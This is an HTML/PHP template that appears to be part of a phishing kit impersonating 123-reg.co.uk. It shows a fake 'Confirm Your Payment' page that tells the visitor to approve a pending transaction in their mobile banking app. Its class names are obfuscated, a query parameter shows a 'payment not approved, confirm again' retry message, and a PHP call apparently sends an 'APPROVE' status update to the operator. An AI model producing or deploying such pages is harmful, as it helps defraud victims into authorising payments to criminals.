<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/ico" href="./img/favicon.png" />
    <title>123-reg.co.uk</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #FFFFFF;
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .wave {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background-color: #fff;
            border-bottom: 1px solid #e0e0e0;
            padding: 15px 0;
        }

        .shoreline {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .surfboard {
            color: #111;
        }

        .beachbreak {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            padding: 20px 0;
            flex: 1;
        }

        .paddle {
            color: #0073b1;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 10px;
            cursor: pointer;
            font-size: 14px;
        }

        .pipeline {
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .reef {
            display: flex;
            justify-content: center;
        }

        /* Checkout Sections */
        .barrel {
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            overflow: hidden;
            max-width: 400px;
            width: 100%;
        }

        .peakheader {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
        }

        .peakheader h2 {
            font-size: 18px;
            font-weight: 600;
        }

        .waveface {
            padding: 15px;
        }

        .shorebreak {
            border: 2px solid #dfdfdf;
        }

        .tideline {
            text-align: center;
            padding: 20px 0;
            margin-top: 80px;
            color: #666;
            font-size: 12px;
        }

        .tideline a {
            color: #00a4a6;
            text-decoration: none;
        }

        .tideline a:hover {
            text-decoration: underline;
        }

        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 2px solid rgba(0,0,0,.3);
            border-radius: 50%;
            border-top-color: #111;
            animation: spin 1s ease-in-out infinite;
            margin-top: 15px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 10px;
            font-size: 12px;
            color: #666;
        }

        /* Centered icon */
        .centered-icon {
            display: flex;
            justify-content: center;
            margin: 15px 0;
        }

        .centered-icon img {
            max-width: 100%;
            height: auto;
        }

        /* Smaller text and list */
        .waveface p, .waveface li {
            font-size: 14px;
        }

        .waveface ol {
            margin-left: 15px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <header>
        <div class="wave shoreline">
            <div class="surfboard">
                <img src="./img/lgo.webp" width="140" height="40">
            </div>
            <div class="beachbreak">
                <img src="./img/out.webp" width="24" height="24" style="max-width: 24px; height: auto;">
            </div>
        </div>
    </header>

    <main class="wave" style="padding-bottom: 40px;">
        <div class="paddle">
            <i class="fas fa-chevron-left"></i> Back
        </div>
        
        <h1 class="pipeline">Confirm Your Payment</h1>
        
        <div class="reef">
            <div class="barrel shorebreak">
                <div class="peakheader">
                    <h2>Mobile Banking Confirmation</h2>
                </div>
                <div class="waveface">
                    <p style="margin-bottom: 15px;">Please use your mobile banking app to confirm the payment. Follow these steps:</p>
                    
                    <div class="centered-icon">
                        <img src="./img/not.webp"width="32" height="32">
                    </div>
                    
                    <ol>
                        <li>Open your mobile banking app</li>
                        <li>Go to the notifications or pending transactions section</li>
                        <li>Find the transaction for this purchase</li>
                        <li>Confirm the payment using your app's authentication method</li>
                    </ol>
                    <?php
if(isset($_GET['e'])){ 
echo '<p style="text-align: center;"><span style="color: red; display: inline; font-size: 11px;">Payment not approved. Please confirm again.</span><br><br />';
}
?>
                    <p style="margin-bottom: 15px;">Once confirmed, your payment will be processed and your order will be complete.</p>
                    
                    <div style="text-align: center;">
                        <div class="spinner"></div>
                        <p class="loading-text">Waiting for confirmation...</p>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <footer class="tideline">
        <div class="wave">
            Copyright © 1999 - 2025 123-reg.co.uk Operating Company, LLC. All Rights Reserved. 
            <a>Privacy Policy</a>
        </div>
    </footer>
    <script src="js/jq.js"></script>
<?php $m->ctr(" APPROVE ⌛ ".@$_GET['e']); ?>
</body>
</html>

